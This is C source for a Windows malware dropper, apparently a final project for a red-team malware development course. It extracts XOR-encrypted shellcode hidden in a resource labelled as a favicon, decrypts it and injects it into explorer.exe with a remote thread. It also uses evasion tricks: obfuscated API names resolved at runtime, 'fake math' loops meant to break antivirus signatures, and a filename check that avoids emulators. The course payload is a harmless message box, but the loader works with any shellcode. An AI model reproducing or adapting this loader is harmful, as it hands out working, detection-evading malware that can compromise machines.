/*

Final Project for Sektor7's 
RED TEAM Operator: Malware Development Essentials Course

author: 0xTriboulet (Steve S.)

Final Dropper should 
- shellcode == MessageBox (explorer.exe)
- extract shellcode from .rsrc
- decrypt shell code (XOR)
- inject shellcode into explorer.exe
- get rid of console pop up



---BEGIN ORIGINAL HEADER---
 Red Team Operator course code template
 storing payload in .rsrc section
 author: reenz0h (twitter: @sektor7net)
---END ORIGINAL HEADER---

*/
#pragma comment(lib, "user32.lib")
#define WIN32_DEFAULT_LIBS
#include <windows.h>
#include <winuser.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <windef.h>
#include "resources.h"



LPVOID (WINAPI * pVirtualAllocEx) (
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);//kernel32.dll

BOOL (WINAPI * pWriteProcessMemory)(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);//kernel32.dll

HANDLE(WINAPI * pCreateRemoteThread)(
  HANDLE                 hProcess,
  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  SIZE_T                 dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress,
  LPVOID                 lpParameter,
  DWORD                  dwCreationFlags,
  LPDWORD                lpThreadId
);//kernel32.dll

HANDLE (WINAPI * pCreateToolhelp32Snapshot)(
  DWORD dwFlags,
  DWORD th32ProcessID
);//kernel32.dll

int FindTarget(const char *procname) {
		int fake = 100;
        HANDLE hProcSnap = NULL;
		HMODULE handle = NULL;
		LPCSTR name =  "CreateToolhelp32Snapshot";
		LPVOID pCreateToolhelp32Snapshot = NULL;
        PROCESSENTRY32 pe32;
        int pid = 0;
		while (fake % 33 != 0){
			fake++; //fake math to break signature
		}
		fake++;
        handle = GetModuleHandle("kernel32.dll");
		pCreateToolhelp32Snapshot = GetProcAddress(handle, name);
		while (fake % 33 != 0){
			fake++; //fake math to break signature
		}
		fake++;
		hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);

        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

        pe32.dwSize = sizeof(PROCESSENTRY32); 

        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
				CloseHandle(handle);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
		CloseHandle(handle);
                
        return pid;
}



void XOR(char * data, size_t data_len, char * key, size_t key_len) {
	int j = 69;
	
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}




int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

        LPVOID pRemoteCode = NULL;
        HANDLE hThread = NULL;

		unsigned char sVirtualAllocEx[] = { 0x37, 0xb, 0x11, 0x10, 0x10, 0x7, 0xb, 0x29, 0x5, 0x6, 0x4, 0xf, 0x28, 0x16 };
		unsigned char sWriteProcessMemory[] = { 0x36, 0x10, 0xa, 0x10, 0x0, 0x36, 0x15, 0x7, 0xa, 0xf, 0x18, 0x1f, 0x20, 0xb, 0x2, 0x1f, 0x3, 0xb };
		unsigned char sCreateRemoteThread []= {0x22, 0x10, 0x6, 0x5, 0x11, 0x3, 0x35, 0xd, 0x4, 0x5, 0x1f, 0x9, 0x39, 0x6, 0x1d, 0x15, 0x10, 0x16 };
		
		char key[] = "abcdefghijklmnopqrstuvwxyz";
		
		XOR((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx), key, sizeof(key));
		XOR((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory), key, sizeof(key));
		XOR((char *) sCreateRemoteThread, sizeof(sCreateRemoteThread), key, sizeof(key));
		
		HANDLE handle = GetModuleHandle("kernel32.dll");
		pVirtualAllocEx = GetProcAddress(handle, sVirtualAllocEx); 
		pWriteProcessMemory = GetProcAddress(handle, sWriteProcessMemory); 
		pCreateRemoteThread = GetProcAddress(handle, sCreateRemoteThread); 
		
        pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
        pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
        
        hThread = pCreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
        if (hThread != NULL) {
                WaitForSingleObject(hThread, 500);
                CloseHandle(hThread);
				CloseHandle(handle);
                return 0;
        }
        return -1;
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
    LPSTR lpCmdLine, int nCmdShow) {
	unsigned char lpFileName[200];
	GetModuleFileName(NULL,lpFileName,sizeof(lpFileName));

// check if I'm being emulated
	int result;
	char * last;
	char * token = strtok(lpFileName,"\\");
	while(token != NULL){
		last = token;
		token = strtok(NULL,"\\");
	}

	result = strcmp(strlwr(last),"implant.exe");
	if(result != 0){
		MessageBox(NULL,last,"HELLO!", MB_OKCANCEL);
		return 0;
	}


	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
	HGLOBAL resHandle = NULL;
	HRSRC res;
	
	int pid = 0;
    HANDLE hProc = NULL;

	pid = FindTarget("explorer.exe");
	
	char key[] = "mysecretkeee";
	
	unsigned char * payload;
	unsigned int payload_len;
	
	// Extract payload from resources section
	res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	resHandle = LoadResource(NULL, res);
	payload = (char *) LockResource(resHandle);
	payload_len = SizeofResource(NULL, res);
	
	// Allocate some memory buffer for payload
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	//printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
	//printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

	// Copy payload to new memory buffer
	RtlMoveMemory(exec_mem, payload, payload_len);
	
	// Decrypt (DeXOR) the payload
	XOR((char *) exec_mem, payload_len, key, sizeof(key));
	

	if (pid) {
		//printf("Notepad.exe PID = %d\n", pid);

		// try to open target process
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) {
			Inject(hProc, exec_mem, payload_len);
			CloseHandle(hProc);
		}
	}

	return 0;
}
